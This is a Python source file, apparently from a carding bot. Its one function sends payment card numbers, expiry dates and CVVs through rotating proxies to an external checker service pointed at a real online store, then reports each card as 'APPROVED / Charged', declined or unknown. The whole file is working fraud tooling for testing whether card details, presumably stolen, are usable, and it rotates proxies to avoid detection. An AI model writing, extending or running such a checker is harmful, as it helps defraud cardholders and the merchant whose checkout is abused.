import requests
import time
from utils.proxy import get_proxy, mark_proxy_failed

async def shopify_check(card, month, year, cvv):
    url = "https://web-production-669be.up.railway.app/shopify"
    params = {"site": "https://the3doodler.com/", "cc": f"{card}|{month}|{year}|{cvv}"}
    proxy = get_proxy()
    try:
        start = time.time()
        resp = requests.get(url, params=params, proxies=proxy, timeout=30)
        elapsed = time.time() - start
        if resp.status_code == 200:
            data = resp.json()
            status = data.get('Status', False)
            price = data.get('Price', 'N/A')
            resp_msg = data.get('Response', 'Unknown')
            if status is True or 'order_placed' in str(resp_msg).lower():
                return ("✅ APPROVED", f"Charged | Price: ${price}", True)
            elif 'declined' in str(resp_msg).lower():
                return ("❌ DECLINED", f"Declined: {resp_msg}", False)
            else:
                return ("⚠️ UNKNOWN", resp_msg, None)
        else:
            if proxy: mark_proxy_failed(proxy)
            return ("❌ ERROR", f"HTTP {resp.status_code}", None)
    except Exception as e:
        if proxy: mark_proxy_failed(proxy)
        return ("❌ ERROR", str(e)[:100], None)